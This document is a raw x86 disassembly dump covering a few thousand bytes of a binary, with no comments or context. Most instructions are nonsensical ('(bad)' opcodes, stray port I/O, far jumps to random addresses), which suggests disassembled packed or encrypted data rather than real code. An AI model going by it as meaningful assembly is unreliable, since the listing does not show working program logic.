  415f79:	and    ecx,DWORD PTR [esi]
  415f7b:	das    
  415f7c:	and    ebx,DWORD PTR [ecx+esi*2-0x5ddee05e]
  415f83:	mov    ch,0xd5
  415f85:	sub    BYTE PTR [edx+esi*1-0x5cafadf4],dl
  415f8c:	jne    0x415fcc
  415f8e:	cmp    al,0x46
  415f90:	push   0x13
  415f92:	das    
  415f93:	aas    
  415f94:	mov    esp,0x45e10076
  415f99:	(bad)  
  415f9a:	sub    eax,0xc688c7a7
  415f9f:	pop    esi
  415fa0:	mov    ?,WORD PTR [ecx-0x4c]
  415fa3:	stos   DWORD PTR es:[edi],eax
  415fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fa5:	scas   al,BYTE PTR es:[edi]
  415fa6:	dec    esp
  415fa7:	clc    
  415fa8:	cld    
  415fa9:	mov    ds:0x834595b9,eax
  415fae:	fld    QWORD PTR [ebx+0x4c]
  415fb1:	push   ds
  415fb2:	mov    esp,ecx
  415fb4:	int3   
  415fb5:	sbb    eax,0xa1755a1c
  415fba:	ins    BYTE PTR es:[edi],dx
  415fbb:	cmp    ah,BYTE PTR [esi]
  415fbd:	jns    0x416014
  415fbf:	aas    
  415fc0:	mov    eax,ds:0x7196fbd2
  415fc5:	imul   esp,DWORD PTR [eax+0x73],0x94ecaad7
  415fcc:	jp     0x415fe0
  415fce:	addr16 ds sar esi,0xe5
  415fd3:	in     al,dx
  415fd4:	jnp    0x416006
  415fd6:	push   eax
  415fd7:	fisubr DWORD PTR [ebx+0x5695c1f1]
  415fdd:	push   ds
  415fde:	mov    ebp,0x42972d78
  415fe3:	aam    0x2d
  415fe5:	div    BYTE PTR [eax-0x3e]
  415fe8:	fidivr WORD PTR [ebx]
  415fea:	shr    BYTE PTR [eax+0x40],0x88
  415fee:	pop    ecx
  415fef:	or     al,0x12
  415ff1:	iret   
  415ff2:	(bad)
  415ff6:	and    ch,cl
  415ff8:	sbb    ecx,esp
  415ffa:	cmp    al,0x38
  415ffc:	mov    al,0xd4
  415ffe:	add    BYTE PTR fs:[esi],0x1
  416002:	fdivp  st(0),st
  416004:	rol    DWORD PTR [ebx],cl
  416006:	pop    es
  416007:	aaa    
  416008:	add    BYTE PTR [eax+0xf],0x38
  41600c:	in     eax,0x99
  41600e:	push   ebp
  41600f:	shl    BYTE PTR [edx+eax*4-0x157d467a],0x93
  416017:	dec    edi
  416018:	cli    
  416019:	test   DWORD PTR [eax+0x19],edx
  41601c:	and    DWORD PTR [edi-0x76],0x4e9691bd
  416023:	and    eax,0x9d5242bc
  416028:	mov    esi,0x53ea3195
  41602d:	pop    ss
  41602e:	xchg   esp,eax
  41602f:	(bad)  
  416030:	push   edi
  416031:	mov    ds:0x7cbc913b,al
  416036:	sbb    al,0x5e
  416038:	mov    esi,ds
  41603a:	jae    0x416044
  41603c:	loopne 0x4160bb
  41603e:	int3   
  41603f:	jo     0x416084
  416041:	fcmovnbe st,st(4)
  416043:	into   
  416044:	(bad)  
  416045:	loopne 0x4160ba
  416047:	and    ecx,esi
  416049:	mov    eax,ds:0xad155308
  41604e:	adc    cl,BYTE PTR [esi-0x13]
  416051:	add    DWORD PTR [esi-0x7b77176d],0xeaa56e1
  41605b:	js     0x416016
  41605d:	nop
  41605e:	cmp    DWORD PTR [esi],edi
  416060:	cld    
  416061:	sar    DWORD PTR [bp+si-0x2575],cl
  416066:	mov    al,0xd
  416068:	leave  
  416069:	sar    DWORD PTR [edx+eax*4-0x5479be71],1
  416070:	push   eax
  416071:	mov    al,ds:0x10a5271
  416076:	repnz dec edi
  416078:	xor    DWORD PTR [edx],esi
  41607a:	xor    edx,DWORD PTR [ecx+esi*8+0x4e51a76c]
  416081:	(bad)  
  416082:	mov    bl,0xe1
  416084:	sbb    al,0xca
  416086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416087:	sub    ecx,DWORD PTR [esi+0x7f69f79e]
  41608d:	ins    BYTE PTR es:[edi],dx
  41608e:	mov    ds:0x6af2fb8b,eax
  416093:	or     BYTE PTR [ebx],dh
  416095:	(bad)  
  416096:	idiv   BYTE PTR [esi]
  416098:	(bad)  
  416099:	and    BYTE PTR [eax+ecx*4-0x6],dh
  41609d:	int    0xf0
  41609f:	sbb    BYTE PTR [edi],ah
  4160a1:	imul   esi,DWORD PTR [ebx-0x79],0xffffff89
  4160a5:	aaa    
  4160a6:	(bad)  
  4160a7:	pop    edi
  4160a8:	jo     0x4160bb
  4160aa:	and    al,0x46
  4160ac:	mov    cs,ecx
  4160ae:	ss jmp 0x2010b739
  4160b4:	test   eax,0xe0fd3ca1
  4160b9:	rol    ecx,0xc1
  4160bc:	aam    0x3c
  4160be:	pop    esi
  4160bf:	out    0xe,eax
  4160c1:	sbb    dl,al
  4160c3:	xor    BYTE PTR [edi],bh
  4160c5:	test   BYTE PTR [ebx-0x64],dh
  4160c8:	sub    eax,0xd3fd5811
  4160cd:	xchg   ebx,eax
  4160ce:	pop    ds
  4160cf:	cmp    DWORD PTR [edx+0x24],edx
  4160d2:	stos   BYTE PTR es:[edi],al
  4160d3:	sbb    ecx,DWORD PTR [ecx]
  4160d5:	adc    al,0x1e
  4160d7:	and    esi,DWORD PTR [ebx]
  4160d9:	test   al,0x81
  4160db:	sahf   
  4160dc:	jmp    0x41608d
  4160de:	pop    esi
  4160df:	or     bl,al
  4160e1:	imul   ebp,ebx,0xb96153be
  4160e7:	add    bh,BYTE PTR [ecx-0x6b]
  4160ea:	adc    BYTE PTR [edi+0x69],dl
  4160ed:	lods   eax,DWORD PTR ds:[esi]
  4160ee:	push   esi
  4160ef:	inc    ebp
  4160f0:	jmp    0x9b298d47
  4160f5:	add    eax,0x991d4945
  4160fa:	in     al,0xdb
  4160fc:	(bad)  
  4160fe:	or     bh,BYTE PTR [esi+eax*4]
  416101:	push   ecx
  416102:	jg     0x4160f5
  416104:	inc    edi
  416105:	popf   
  416106:	xor    al,0x23
  416108:	push   ss
  416109:	fistp  DWORD PTR [edi]
  41610b:	mov    BYTE PTR [edx-0x1c8b5ec7],ah
  416111:	retf   
  416112:	adc    dl,BYTE PTR [eax]
  416114:	into   
  416115:	jbe    0x4160a6
  416117:	lock jg 0x41614a
  41611a:	sub    DWORD PTR [ecx-0x6e],0x6f
  41611e:	dec    ebp
  41611f:	outs   dx,DWORD PTR ds:[esi]
  416120:	ror    DWORD PTR [eax+edi*4-0x69],cl
  416124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416125:	cli    
  416126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416127:	clc    
  416128:	mov    edx,0xeccba356
  41612d:	mov    WORD PTR [ecx+0x31da1029],fs
  416133:	xchg   edx,eax
  416134:	or     esp,DWORD PTR [edx-0xb]
  416137:	sahf   
  416138:	add    DWORD PTR [edx],eax
  41613a:	xor    BYTE PTR [esi],dl
  41613c:	inc    ecx
  41613d:	pop    es
  41613e:	xlat   BYTE PTR ds:[ebx]
  41613f:	jmp    0x4160ef
  416141:	shl    DWORD PTR [ebp+ebp*8+0x16],1
  416145:	pop    es
  416146:	sub    BYTE PTR ds:0x13af,0xdb
  41614c:	shl    bl,cl
  41614e:	arpl   WORD PTR [esi],si
  416150:	dec    esp
  416151:	mov    esp,esi
  416153:	out    0x50,al
  416155:	imul   DWORD PTR [ecx+0x1e690d47]
  41615b:	mov    dh,0x61
  41615d:	mov    edi,0x5c49528d
  416162:	outs   dx,BYTE PTR ds:[esi]
  416163:	push   es
  416164:	and    eax,0x15d11fce
  416169:	xor    DWORD PTR [edx+0x50492111],0xffffffff
  416170:	jbe    0x416180
  416172:	int    0x29
  416174:	mov    edx,0xf5e74366
  416179:	loopne 0x4161b6
  41617b:	repnz xchg ecx,eax
  41617e:	(bad)  
  416181:	pop    edx
  416182:	xchg   ebp,esp
  416184:	aaa    
  416185:	inc    ebx
  416186:	(bad)  
  416187:	aas    
  416188:	push   edx
  416189:	aam    0x1f
  41618b:	fstp   DWORD PTR [ebx+0x10]
  41618e:	xchg   ecx,eax
  41618f:	xchg   esi,eax
  416190:	push   ebx
  416191:	test   eax,0xa0da417b
  416196:	dec    eax
  416197:	xlat   BYTE PTR ds:[ebx]
  416198:	push   esi
  416199:	popa   
  41619a:	pop    ss
  41619b:	int3   
  41619c:	mov    bl,0xc
  41619e:	mov    DWORD PTR [ebx-0x10],eax
  4161a1:	imul   esp,DWORD PTR ds:0x67d4ceda,0x47abe04d
  4161ab:	pusha  
  4161ac:	fs mov cl,0x86
  4161af:	or     DWORD PTR [ecx],edi
  4161b1:	scas   eax,DWORD PTR es:[edi]
  4161b2:	stos   DWORD PTR es:[edi],eax
  4161b3:	xchg   edx,eax
  4161b4:	dec    esi
  4161b5:	dec    ebp
  4161b6:	lea    ebx,[edi-0x68]
  4161b9:	jg     0x416199
  4161bb:	(bad)  
  4161bc:	xor    ecx,esp
  4161be:	xchg   edi,eax
  4161bf:	fwait
  4161c0:	je     0x4161cc
  4161c2:	or     eax,0xdc84b4c1
  4161c7:	xor    ah,0x72
  4161ca:	dec    esi
  4161cb:	mov    ah,0x20
  4161cd:	jae    0x41618e
  4161cf:	fs aam 0xde
  4161d2:	xchg   ebx,eax
  4161d3:	ins    DWORD PTR es:[edi],dx
  4161d4:	sar    BYTE PTR [ebp+0x1b2a0ebf],cl
  4161da:	inc    edx
  4161db:	fidiv  DWORD PTR [ecx+0x1cfc1ac8]
  4161e1:	push   ecx
  4161e2:	in     al,dx
  4161e3:	aam    0x26
  4161e5:	jmp    0x416211
  4161e7:	or     al,0x5f
  4161e9:	and    ebx,DWORD PTR [ecx+ebp*2]
  4161ec:	aad    0xe0
  4161ee:	sbb    bl,ah
  4161f0:	push   cs
  4161f1:	pop    es
  4161f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f3:	dec    esi
  4161f4:	fucomi st,st(5)
  4161f6:	and    edi,esp
  4161f8:	push   es
  4161f9:	sbb    al,0xb6
  4161fb:	inc    eax
  4161fc:	mov    es,esp
  4161fe:	and    BYTE PTR [eax+0xc],ah
  416201:	ror    DWORD PTR [edx],0x60
  416204:	shr    al,1
  416206:	in     al,dx
  416207:	mov    ah,0x7a
  416209:	loope  0x416274
  41620b:	inc    eax
  41620c:	or     BYTE PTR [ebx+ecx*4],ch
  41620f:	lods   al,BYTE PTR ds:[esi]
  416210:	aam    0x5d
  416212:	xlat   BYTE PTR ds:[ebx]
  416213:	nop
  416214:	adc    ebx,DWORD PTR [esi+edx*8]
  416217:	ds jmp 0x74ee86fc
  41621d:	fsubrp st(3),st
  41621f:	mov    edi,0x60726470
  416224:	jle    0x4161ca
  416226:	adc    bh,BYTE PTR [edx+0x7d7c0de5]
  41622c:	pop    eax
  41622d:	push   cs
  41622e:	loopne 0x4161d8
  416230:	push   0x164f7207
  416235:	pushf  
  416236:	in     al,0x82
  416238:	or     al,0x47
  41623a:	lea    ecx,[ebp+0x4f05f01d]
  416240:	hlt    
  416241:	call   0xbbf0:0x6caaf3d4
  416248:	sbb    ah,BYTE PTR [ebp+0x25285e96]
  41624e:	mov    ebp,0xdd02020f
  416253:	ficom  DWORD PTR [ecx+0x7a]
  416256:	arpl   WORD PTR [esi+eax*8],cx
  416259:	cmp    eax,0x3a0ed9f4
  41625e:	addr16 hlt 
  416260:	(bad)  
  416262:	pop    ss
  416263:	mov    dh,0x85
  416265:	leave  
  416266:	ins    DWORD PTR es:[edi],dx
  416267:	cmp    eax,0x98c6983c
  41626c:	dec    ecx
  41626d:	pushw  0x484f
  416271:	inc    edx
  416272:	and    DWORD PTR [esi-0x41],esi
  416275:	sbb    DWORD PTR cs:[edi-0x79ec7d76],ebp
  41627c:	shr    DWORD PTR [ebx-0x34],1
  41627f:	pop    ecx
  416280:	rcr    DWORD PTR [eax-0x7e],1
  416283:	sbb    DWORD PTR [edi-0x58],ecx
  416286:	sub    al,0xf
  416288:	ret    0xe04f
  41628b:	sbb    BYTE PTR [ebp+0x3f80a205],dh
  416291:	sbb    ebp,DWORD PTR [ebp-0x5c]
  416294:	neg    BYTE PTR [edi]
  416296:	cmp    BYTE PTR [ebx],ch
  416298:	mov    ebp,0xd5ba1b9f
  41629d:	cmp    BYTE PTR [ecx+0x1f],ah
  4162a0:	or     dh,al
  4162a2:	sbb    esp,DWORD PTR [eax+edi*2]
  4162a5:	push   cs
  4162a6:	int3   
  4162a7:	scas   al,BYTE PTR es:[edi]
  4162a8:	loopne 0x416265
  4162aa:	ins    BYTE PTR es:[edi],dx
  4162ab:	cmp    BYTE PTR [edi+0x42],ah
  4162ae:	je     0x416255
  4162b0:	addr16 rol ch,1
  4162b3:	bound  edx,QWORD PTR [edi-0x1cace12]
  4162b9:	jge    0x416287
  4162bb:	mov    ds:0xb79f5ce3,eax
  4162c0:	mov    esp,0x20f1aaad
  4162c5:	fidiv  DWORD PTR [eax]
  4162c7:	test   al,0x7a
  4162c9:	dec    ebp
  4162ca:	clc    
  4162cb:	jg     0x4162e9
  4162cd:	(bad)  
  4162ce:	jb     0x416332
  4162d0:	arpl   bp,sp
  4162d2:	cdq    
  4162d3:	fmulp  st(2),st
  4162d5:	add    al,0x1a
  4162d7:	ins    BYTE PTR es:[edi],dx
  4162d8:	push   edi
  4162d9:	fdivr  DWORD PTR [ebx]
  4162db:	test   DWORD PTR [esi+0x472e065a],edi
  4162e1:	pushf  
  4162e2:	aas    
  4162e3:	test   al,0x1d
  4162e5:	push   cs
  4162e6:	inc    edx
  4162e7:	repz or DWORD PTR [esi-0x38],ecx
  4162eb:	test   edi,ebx
  4162ed:	inc    esi
  4162ee:	enter  0x89bf,0xd9
  4162f2:	xlat   BYTE PTR ds:[ebx]
  4162f3:	adc    al,0xad
  4162f5:	xor    bl,ch
  4162f7:	xor    ecx,DWORD PTR cs:[ecx-0x46b0cb3a]
  4162fe:	bound  esi,QWORD PTR [ecx-0x356fcaba]
  416304:	push   eax
  416305:	xlat   BYTE PTR ds:[ebx]
  416306:	or     al,0x29
  416308:	sbb    BYTE PTR [edx-0x3d],ah
  41630b:	mov    DWORD PTR [edx-0x66],esi
  41630e:	xchg   esi,eax
  41630f:	or     ch,BYTE PTR [ebp-0x5e]
  416312:	jmp    0x6c35:0xb06ceb5d
  416319:	sar    DWORD PTR [ecx+0x5b40e462],0xdf
  416320:	push   esi
  416321:	lahf   
  416322:	fidiv  DWORD PTR [eax+0x25]
  416325:	inc    ebp
  416326:	and    ecx,DWORD PTR [edi-0x4a]
  416329:	js     0x416392
  41632b:	mov    dl,BYTE PTR [edx+0x749ca79c]
  416331:	push   eax
  416332:	ror    BYTE PTR [ecx-0x73],cl
  416335:	test   eax,0xf153909a
  41633a:	test   DWORD PTR [esi+ebx*1+0x7f],ebp
  41633e:	(bad)  
  41633f:	fbstp  TBYTE PTR [edx-0x71]
  416342:	pop    esp
  416343:	pop    ecx
  416344:	rcr    edx,cl
  416346:	and    BYTE PTR [esp+eiz*4-0x53294a49],0x74
  41634e:	xchg   edi,eax
  41634f:	inc    esi
  416350:	adc    bh,BYTE PTR [ecx+0x6089dacf]
  416356:	dec    ecx
  416357:	mov    ecx,ds
  416359:	inc    ebx
  41635a:	mov    ch,0xc3
  41635c:	push   ecx
  41635d:	jbe    0x416388
  41635f:	rol    BYTE PTR [eax-0x6e],0x7b
  416363:	call   0xa24f:0x88780b82
  41636a:	or     al,BYTE PTR [ebx-0x7ef6f2ef]
  416370:	push   ebx
  416371:	mov    dl,0xfe
  416373:	ins    BYTE PTR es:[edi],dx
  416374:	lock aaa 
  416376:	mov    eax,0x316b6a51
  41637b:	jge    0x416344
  41637d:	xor    DWORD PTR [eax-0x3e],edx
  416380:	jl     0x41634d
  416382:	xor    al,0x2
  416384:	dec    esi
  416385:	test   al,0x29
  416387:	ret    0x2c73
  41638a:	adc    ch,BYTE PTR [eax+0x68623902]
  416390:	inc    esp
  416391:	in     eax,0x1b
  416393:	icebp  
  416394:	outs   dx,DWORD PTR ds:[esi]
  416395:	sbb    ah,BYTE PTR [ebx-0x42]
  416398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416399:	xchg   ebx,eax
  41639a:	jp     0x41631c
  41639c:	push   esi
  41639d:	(bad)  
  41639e:	scas   al,BYTE PTR es:[edi]
  41639f:	je     0x4163f8
  4163a1:	outs   dx,BYTE PTR ds:[esi]
  4163a2:	rol    DWORD PTR [eax+0x3d],cl
  4163a5:	inc    ebx
  4163a6:	fsub   st(5),st
  4163a8:	xchg   esi,eax
  4163a9:	push   edi
  4163aa:	mov    cl,0x9
  4163ac:	pop    ss
  4163ad:	add    al,0x50
  4163af:	sub    bl,al
  4163b1:	mov    ebp,0xc7f3c99f
  4163b6:	sub    al,0x44
  4163b8:	mov    cl,0x9b
  4163ba:	jge    0x41637e
  4163bc:	ss pop edx
  4163be:	cmp    ecx,DWORD PTR [eax-0x7c47e96]
  4163c4:	mov    ds:0xbfb472a1,al
  4163c9:	and    bh,BYTE PTR [ebx-0x7573a70a]
  4163cf:	test   BYTE PTR [esi-0x7a],bh
  4163d2:	mov    ah,0x69
  4163d4:	push   0x4bc21a29
  4163d9:	mov    ebx,0xeb786b4b
  4163de:	dec    ecx
  4163df:	jno    0x41639f
  4163e1:	sbb    BYTE PTR [edx],dh
  4163e3:	pop    ds
  4163e4:	mov    dl,0x53
  4163e6:	jecxz  0x416415
  4163e8:	in     eax,dx
  4163e9:	dec    ebx
  4163ea:	adc    DWORD PTR [ecx-0x6b],edx
  4163ed:	or     eax,0xf1a9dc34
  4163f2:	jge    0x4163c4
  4163f4:	dec    eax
  4163f5:	xchg   DWORD PTR [ecx-0x1e],ebp
  4163f8:	mov    eax,0xa5ba9188
  4163fd:	xchg   esp,eax
  4163fe:	push   cs
  4163ff:	xor    BYTE PTR [ebp-0x45],cl
  416402:	push   edx
  416403:	fs popa 
  416405:	out    dx,al
  416406:	jp     0x41642e
  416408:	dec    edx
  416409:	(bad)  
  41640a:	in     eax,0x73
  41640c:	mov    ds:0x511e4120,eax
  416411:	or     eax,0x49e98219
  416416:	hlt    
  416417:	das    
  416418:	add    esi,edi
  41641a:	pop    edx
  41641b:	pop    eax
  41641c:	into   
  41641d:	mov    esp,0x4ff68a25
  416422:	xor    DWORD PTR [esi-0x1f38b98f],ecx
  416428:	in     eax,0xf6
  41642a:	mov    ch,0x23
  41642c:	repz push edi
  41642e:	das    
  41642f:	shr    DWORD PTR [edi+0x38f5a05d],0x6e
  416436:	test   eax,0x2bbc76fc
  41643b:	call   0x93d9:0x29fae9ae
  416442:	dec    eax
  416443:	or     dl,BYTE PTR [ebx-0x2f]
  416446:	mov    ah,0xe2
  416448:	mov    edx,0x17618243
  41644d:	ss dec esi
  41644f:	fwait
  416450:	mov    edx,DWORD PTR ds:0x6b9b0543
  416456:	lods   eax,DWORD PTR ds:[esi]
  416457:	adc    cl,BYTE PTR [eax]
  416459:	jae    0x41646a
  41645b:	clc    
  41645c:	and    BYTE PTR [ecx+0x6a2f94b],0x16
  416463:	(bad)  
  416464:	out    0x13,eax
  416466:	or     al,0x55
  416468:	mov    eax,0x101acfb
  41646d:	mov    esp,0x212af62f
  416472:	mov    al,ds:0x8887f8b2
  416477:	or     al,0xce
  416479:	sahf   
  41647a:	jmp    0xdbd5:0x95705c0e
  416481:	adc    esp,DWORD PTR [ebx+0x0]
  416484:	dec    edi
  416485:	loopne 0x416426
  416487:	outs   dx,DWORD PTR ds:[esi]
  416488:	mov    ds:0xf682a037,eax
  41648d:	icebp  
  41648e:	(bad)  
  41648f:	aam    0x8a
  416491:	pop    eax
  416492:	xor    al,0x5
  416494:	clc    
  416495:	bound  ebx,QWORD PTR [esi+0x3b694913]
  41649b:	jns    0x4164c2
  41649d:	(bad)  
  41649e:	xchg   ecx,eax
  41649f:	int3   
  4164a0:	xor    bl,BYTE PTR [edi+eax*8]
  4164a3:	xchg   esp,eax
  4164a4:	out    0x61,al
  4164a6:	or     al,0x50
  4164a8:	into   
  4164a9:	sub    DWORD PTR [ecx+edx*4-0x23],0x742066e1
  4164b1:	shr    ch,1
  4164b3:	jmp    0x57278095
  4164b8:	dec    ebx
  4164b9:	sub    eax,0xcf1eceef
  4164be:	test   eax,0xa1082361
  4164c3:	jmp    0x1c3f31b
  4164c8:	jmp    0x4164c3
  4164ca:	lea    eax,[edi-0x1581d13c]
  4164d0:	mov    dh,0xbf
  4164d2:	inc    ebp
  4164d3:	mov    ah,0xf8
  4164d5:	add    al,0x6d
  4164d7:	in     eax,0x4d
  4164d9:	(bad)  
  4164da:	rcr    BYTE PTR ss:[edi],cl
  4164dd:	ins    DWORD PTR es:[edi],dx
  4164de:	adc    ebx,DWORD PTR [edi+0x43]
  4164e1:	mov    eax,0x2869c4c3
  4164e6:	or     bl,BYTE PTR [esp+eiz*2+0x5a]
  4164ea:	out    0x9c,al
  4164ec:	sbb    edx,ecx
  4164ee:	(bad)  
  4164ef:	or     ch,BYTE PTR [ebx]
  4164f1:	repnz hlt 
  4164f3:	leave  
  4164f4:	(bad)  
  4164f5:	aad    0x8c
  4164f7:	inc    edi
  4164f8:	popf   
  4164f9:	sbb    ecx,0x861eac79
  4164ff:	jg     0x416505
  416501:	cmp    eax,0x4d09b4a0
  416506:	add    BYTE PTR [ecx+eiz*8-0x17c29ce5],cl
  41650d:	pop    es
  41650e:	call   0xbfd8:0x32682802
  416515:	das    
  416516:	in     eax,0x4d
  416518:	jle    0x4164d9
  41651a:	add    DWORD PTR [edi],ebp
  41651c:	data16 lock lahf 
  41651f:	cmovp  ebp,DWORD PTR [esi+0x64]
  416523:	push   ds
  416524:	scas   eax,DWORD PTR es:[edi]
  416525:	xor    al,0xcc
  416527:	add    al,0x4d
  416529:	iret   
  41652a:	add    cl,BYTE PTR [edi+0x16]
  41652d:	stc    
  41652e:	xchg   ecx,eax
  41652f:	rcr    BYTE PTR ss:[ebp-0x54],0xd3
  416534:	fild   DWORD PTR ds:0x62e6f9bd
  41653a:	inc    edx
  41653b:	pop    esi
  41653c:	xchg   ebx,eax
  41653d:	and    eax,0x15585a0
  416542:	int    0xfd
  416544:	dec    ecx
  416545:	sub    al,0x74
  416547:	xor    bl,bl
  416549:	clc    
  41654a:	call   0x8532:0xb3913896
  416551:	jne    0x41650d
  416553:	xchg   DWORD PTR [eax],ebx
  416555:	jnp    0x4165b2
  416557:	call   0xf1b68bc
  41655c:	dec    edx
  41655d:	inc    ebp
  41655e:	pop    edx
  41655f:	lock ror cl,1
  416562:	fdivr  st(0),st
  416564:	pop    edx
  416565:	jo     0x41651a
  416567:	aas    
  416568:	jmp    0xbd63:0x928882ee
  41656f:	fnstsw WORD PTR [ebx+0x6e48794e]
  416575:	es test al,0x3f
  416578:	pop    esp
  416579:	nop
  41657a:	arpl   ax,bp
  41657c:	jmp    0x1c473a93
  416581:	cli    
  416582:	and    eax,DWORD PTR [esi-0x44]
  416585:	fchs   
  416587:	pop    es
  416588:	gs in  al,dx
  41658a:	iret   
  41658b:	xlat   BYTE PTR ds:[ebx]
  41658c:	(bad)  
  41658d:	xchg   edx,eax
  41658e:	stos   DWORD PTR es:[edi],eax
  41658f:	push   ss
  416590:	mov    cs,WORD PTR [ebp+0x3dce9f06]
  416596:	lock or al,0x75
  416599:	push   0x175af81e
  41659e:	xchg   edx,eax
  41659f:	or     ebp,DWORD PTR [edi-0x14]
  4165a2:	ins    DWORD PTR es:[edi],dx
  4165a3:	mov    BYTE PTR [esi+eax*4-0x6],al
  4165a7:	loop   0x416626
  4165a9:	mov    ecx,0x3c95d886
  4165ae:	jmp    0xd7ef:0x7094b9f2
  4165b5:	jb     0x416632
  4165b7:	push   esp
  4165b8:	ret    0x530c
  4165bb:	mov    BYTE PTR [ebx+0x3e1e62a1],dl
  4165c1:	(bad)  
  4165c2:	loope  0x4165d0
  4165c4:	sbb    eax,DWORD PTR [esi-0x5d]
  4165c7:	mov    ch,0x38
  4165c9:	and    BYTE PTR [ecx-0x3009fed4],ch
  4165cf:	imul   esp,DWORD PTR [esp+eax*2],0xf58f7012
  4165d6:	push   ss
  4165d7:	add    dh,BYTE PTR [edx+0x515af2c0]
  4165dd:	out    0x5e,eax
  4165df:	in     al,dx
  4165e0:	out    dx,al
  4165e1:	jbe    0x4165fb
  4165e3:	(bad)  
  4165e6:	mov    BYTE PTR [esi-0xb695e65],ch
  4165ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ed:	imul   ebp,DWORD PTR [ebx-0x78339d4b],0x13
  4165f4:	lsl    ecx,sp
  4165f7:	aad    0xf8
  4165f9:	ins    BYTE PTR es:[edi],dx
  4165fa:	lods   al,BYTE PTR ds:[esi]
  4165fb:	fisubr WORD PTR [ecx+ecx*8]
  4165fe:	jne    0x416594
  416600:	cmp    edx,DWORD PTR [ecx]
  416602:	add    esi,edi
  416604:	int    0x76
  416606:	or     BYTE PTR [edx+edx*8-0x14c7296b],ah
  41660d:	or     BYTE PTR [ecx-0x6d6429ce],0x51
  416614:	adc    bh,dh
  416616:	enter  0x107b,0xfe
  41661a:	adc    al,0x60
  41661c:	aas    
  41661d:	jno    0x41666a
  41661f:	or     al,0xe5
  416621:	cdq    
  416622:	ror    ch,cl
  416624:	sbb    cl,BYTE PTR [ebx]
  416626:	icebp  
  416627:	xchg   ebx,eax
  416628:	sbb    DWORD PTR [ecx+0x2f],ecx
  41662b:	xchg   edi,eax
  41662c:	adc    al,0x27
  41662e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41662f:	mov    dh,0x11
  416631:	and    eax,0xba30ef6a
  416636:	ins    BYTE PTR es:[edi],dx
  416637:	pop    eax
  416638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416639:	mov    bh,0x48
  41663b:	leave  
  41663c:	clc    
  41663d:	push   0xf775ef65
  416642:	fldcw  WORD PTR [ebp+0x49]
  416645:	dec    ebx
  416646:	sbb    DWORD PTR [eax],ecx
  416648:	sbb    dh,al
  41664a:	mov    ebp,0xd17ea48c
  41664f:	pusha  
  416650:	jns    0x416610
  416652:	cld    
  416653:	add    cl,dh
  416655:	sbb    eax,DWORD PTR [eax+ebp*4-0x45]
  416659:	add    ah,bl
  41665b:	fcomp  DWORD PTR [eax+0x74]
  41665e:	and    ch,BYTE PTR [ebx-0x708dc63e]
  416664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416665:	sbb    DWORD PTR [edx-0x14],edi
  416668:	lds    esp,FWORD PTR [eax]
  41666a:	mov    dl,ch
  41666c:	std    
  41666d:	jmp    0x7c463a9c
  416672:	in     eax,dx
  416673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416674:	imul   eax,DWORD PTR [eax-0x37795cc],0x6f935b7d
  41667e:	inc    ebx
  41667f:	nop
  416680:	fnstcw WORD PTR [edx]
  416682:	sub    al,0xe6
  416684:	push   ecx
  416685:	jecxz  0x4166c7
  416687:	push   ds
  416688:	add    bh,BYTE PTR [eax]
  41668a:	jb     0x41668c
  41668c:	mov    ds:0x6aef7804,eax
  416691:	mov    cl,0x88
  416693:	jle    0x41667b
  416695:	push   0xcd6a2b1b
  41669a:	jle    0x416690
  41669c:	cmp    eax,0x2cd40590
  4166a1:	clc    
  4166a2:	jecxz  0x416718
  4166a4:	rcl    DWORD PTR [ebx-0x73ac5cc9],0x64
  4166ab:	sbb    edi,DWORD PTR [edx+ecx*2+0x2adac2bc]
  4166b2:	mov    bh,0xf9
  4166b4:	xchg   esp,eax
  4166b5:	fmul   DWORD PTR [edx]
  4166b7:	imul   esp,DWORD PTR ds:0xe55ca3c4,0x8322ab6
  4166c1:	fist   WORD PTR [ecx]
  4166c4:	adc    BYTE PTR [eax],bl
  4166c6:	push   ds
  4166c7:	jmp    0x8809:0x67e5ac6a
  4166ce:	daa    
  4166cf:	lods   eax,DWORD PTR ds:[esi]
  4166d0:	cmp    eax,0xc143ef8
  4166d5:	push   0x23497883
  4166da:	mov    ch,0x37
  4166dc:	pushf  
  4166dd:	mov    esp,edi
  4166df:	dec    ebp
  4166e0:	sbb    BYTE PTR [esi+esi*2],bl
  4166e3:	pop    ds
  4166e4:	fisubr DWORD PTR [edx-0x1b1a298e]
  4166ea:	data16 in al,0x53
  4166ed:	mov    bh,0xe4
  4166ef:	test   BYTE PTR [edi],dl
  4166f1:	mov    esi,0xee584ae
  4166f6:	popa   
  4166f7:	jl     0x41672d
  4166f9:	es jecxz 0x41671c
  4166fc:	push   cs
  4166fd:	sar    ah,1
  4166ff:	xor    ah,BYTE PTR [eax]
  416701:	scas   eax,DWORD PTR es:[edi]
  416702:	gs mov edi,0x1436cd0
  416708:	fwait
  416709:	add    BYTE PTR [edx+0x2e],dl
  41670c:	out    0x74,eax
  41670e:	xchg   BYTE PTR [eax+0x333db61c],bl
  416714:	(bad)  
  416715:	mov    edx,0x4c57fd97
  41671a:	jo     0x416748
  41671c:	pop    edi
  41671d:	lock mov al,0x3e
  416720:	imul   esp,ebx,0x4a3922da
  416726:	jl     0x4166f9
  416728:	sti    
  416729:	pop    ebp
  41672a:	dec    esi
  41672b:	fs mov ecx,0xf1e90a15
  416731:	js     0x416763
  416733:	ret    0x6c78
  416736:	mov    edx,DWORD PTR [edi]
  416738:	push   es
  416739:	arpl   WORD PTR [ebx+eax*2+0x27],cx
  41673d:	push   es
  41673e:	(bad)  
  41673f:	sub    bl,ah
  416741:	arpl   WORD PTR [esi-0x50],bp
  416744:	sbb    cl,bl
  416746:	je     0x416737
  416748:	pop    edi
  416749:	out    dx,al
  41674a:	xchg   edx,eax
  41674b:	push   0xffffff9e
  41674d:	xor    bh,BYTE PTR [ebx+eax*4]
  416750:	inc    WORD PTR [ecx]
  416753:	jbe    0x41674c
  416755:	fist   WORD PTR [edi]
